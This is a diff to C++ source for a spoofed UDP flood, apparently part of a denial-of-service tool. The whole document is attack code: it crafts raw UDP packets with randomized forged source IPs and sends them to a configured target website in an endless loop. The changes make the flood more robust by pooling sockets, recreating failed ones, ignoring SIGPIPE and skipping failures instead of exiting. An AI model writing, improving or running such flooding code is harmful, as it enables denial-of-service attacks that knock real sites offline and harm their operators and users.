@@ -4,12 +4,16 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <netdb.h>
+#include <csignal>
 
 #include "Randomizer.hpp"
 #include "Spoofed_UDP_Flood.hpp"
 
 void Spoofed_UDP_Flood::attack(const int *id) {
-    int s, on = 1, x;
+    std::vector<int> sockets;
+    for (int x = 0; x < conf->CONNECTIONS; x++) {
+        sockets.push_back(0);
+    }
     std::string message{};
     char buf[8192], *pseudogram;
     struct pseudo_header psh{};
@@ -18,17 +22,12 @@ void Spoofed_UDP_Flood::attack(const int *id) {
     struct hostent *hp;
     struct sockaddr_in dst{};
     auto s_port = Randomizer::randomInt(0, 65535);
+    signal(SIGPIPE, &Spoofed_UDP_Flood::broke);
     while (true){
-        for(x = 0; x < conf->CONNECTIONS; x++){
+        for(int x = 0; x < conf->CONNECTIONS; x++){
             bzero(buf, sizeof(buf));
-            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1){
-                logger->Log("socket() error", Logger::Error);
-                exit(EXIT_FAILURE);
-            }
-
-            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1){
-                logger->Log("setsockopt() error", Logger::Error);
-                exit(EXIT_FAILURE);
+            if(!sockets[x]){
+                sockets[x] = make_socket(IPPROTO_UDP);
             }
 
             if((hp = gethostbyname(conf->website.c_str())) == nullptr){
@@ -40,8 +39,7 @@ void Spoofed_UDP_Flood::attack(const int *id) {
                 bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
             }
             if((ip->saddr = inet_addr(Randomizer::randomIP())) == -1){
-                logger->Log("Unable to set random src ip", Logger::Error);
-                exit(EXIT_FAILURE);
+                continue;
             }
 
             // IP Struct
@@ -80,16 +78,11 @@ void Spoofed_UDP_Flood::attack(const int *id) {
 
             udp->check = csum( (unsigned short*) pseudogram , psize);
 
-            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1){
-                logger->Log("setsockopt() error", Logger::Error);
-                exit(EXIT_FAILURE);
-            }
 
-            if(sendto(s, buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) == -1){
-                logger->Log("sendto() error", Logger::Error);
-                exit(EXIT_FAILURE);
+            if(sendto(sockets[x], buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) == -1){
+                close(sockets[x]);
+                sockets[x] = make_socket(IPPROTO_UDP);
             }
-            close(s);
         }
         message = std::to_string(*id) + ": Voly Sent";
         logger->Log(&message, Logger::Info);
